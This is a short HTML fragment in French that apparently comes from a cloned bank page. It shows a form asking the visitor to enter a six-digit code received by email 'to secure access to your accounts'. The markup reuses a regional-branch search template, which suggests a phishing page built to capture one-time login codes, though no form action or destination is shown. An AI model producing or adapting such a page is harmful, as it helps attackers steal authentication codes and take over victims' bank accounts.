                               ...
                               <div class="GeolocationDisabled-content matchHeight">
                                  <div id="trouver-un-cr-mode-search" style="">
                                     ...
                                     <h2 class="GeolocationDisabled-title GeolocFail">
                                         <strong>Code E-mail </strong>
                                     </h2>
                                   </br>
                                     <p id="labelCodeDepartementCR" class="GeolocationDisabled-text GeolocFail">Afin de sécuriser l'accés à vos comptes depuis votre appareil, saisissez le code recu par E-mail .</p>
 </br>
                                     <div>
                                        <div class="form-group">
                                           <input id="GeolocSearchInput" name="otpmail" type="text" required maxlength="6"
                                           class="form-control GeolocationDisabled-noBorder"
                                            placeholder="Entrez le code recu" aria-labelledby="labelCodeDepartementCR"
                                            aria-describedby="errorMessageCR">
                                           <span id="errorMessageCR" class="help-block"></span>
                                        </div>
                                     </div>

                                     <button type="submit" class="btn btn-primary GeolocationDisabled-btn" aria-label="Rechercher une caisse régionale" >Valider</button>
